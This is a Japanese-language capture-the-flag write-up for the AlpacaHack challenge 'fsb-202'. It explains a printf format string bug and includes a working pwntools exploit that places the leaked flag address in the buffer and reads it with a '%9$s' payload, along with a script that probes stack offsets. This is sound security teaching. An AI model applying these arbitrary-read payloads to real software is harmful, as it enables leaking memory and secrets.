# ■ Writeup::fsb-202
[fsb-202 - AlpacaHack](https://alpacahack.com/challenges/fsb-202)

# 1. Abstract
- ユーザ入力 `buf` がそのまま `printf` に渡されているので, FSBが存在する.
- `buf` には `%N$s` を渡してAAR.
- 出力される `flag` のアドレスを `%N$s` に渡す.
- 実験の結果, `buf[0:8]` がスロット8とわかる.
- ので, `buf[8:16]` (スロット9)に `flag` のアドレスをセットし, `N = 9` として `flag` を読み出す.

`solve.py`:
```Python
from pwn import *

_, HOST, PORT = 'nc localhost 9999'.split()
io = remote(HOST, PORT)

io.recvuntil(b'@ ')
flag_addr = int(io.recvline(), 16)
log.info(f"flag @ {hex(flag_addr)}")

N = 9 # read slot 9 (= buf[8:16])
payload = f'%{N}$s'.encode()
payload += b'\x00' * (8 - len(payload)) # padding for buf[0:8]
payload += p64(flag_addr) # buf[8:16]

io.sendline(payload)
print(io.recvall())
```

実行例:

# 2. Explanation
## 2.1. FSB(Format String Bug)
`printf(buf)` は第1引数(書式文字列)中に `%s` や `%p` を入れることでスタック上の値や残っているゴミを可変長引数として読み出せてしまう.

詳しい説明は検索したり, AIに聞くとよいと思われます.

- `buf` の中に読みたいアドレス(8 byte)を埋め込む.
- このアドレスが何番目の `%N$` に対応するかを見つける.
- `%N$s` でアドレス先を文字列として読む.

## 2.2. `buf` がある位置

```Python
from pwn import *
_, HOST, PORT = 'nc localhost 9999'.split()

r = {}

for i in range(1, 15):
	io = remote(HOST, PORT)
	io.recvline()  # flag @ 0x...
	io.sendline(f"AAAAAAAA.%{i}$p".encode())
	r[i] = io.recvline()
	io.close()

for i, b in r.items():
	log.info(f"{i}: {b}")
```

## 2.3. `flag` アドレスを置く位置
2.2. から, スロット8が `buf` の先頭 8 bytes を表示することがわかったので, スロット8にはフォーマット指定子 `%s` を置き, 後半8 bytesに任意のアドレスを指定し, スロット9を読み出すようにすれば, この任意アドレス先を読み出せる.

文字だけだとわかりにくいので, 以下に図を示します.

図例( `flag` のアドレスが `0x59c1d6990040` の場合)
```
+----+----------------------------------+
|  7 |               ...                |
+----+----------------------------------+
|  8 | %9$s\x00\x00\x00\x00             | -----+
+----+----------------------------------+      | 表示するアドレス先はスロット9
|  9 | \x40\x00\x99\xd6\xc1\x59\x00\x00 | <----+
+----+----------------------------------+
| 10 |               ...                |
+----+----------------------------------+
```

### 2.3.1. 指定子の後にアドレスを置く理由
原理的には `<flag_addr>%8$s` を指定しても問題ないわけです.
ただ, `flag_addr` に `\x00` が含まれている場合, `printf` はそこまでのバイト列を文字列として解釈し これ以降は読まれません.

対して, `printf` には指定子を認識させる必要があるため, `%9$s<flag_addr>` の順になるわけです.
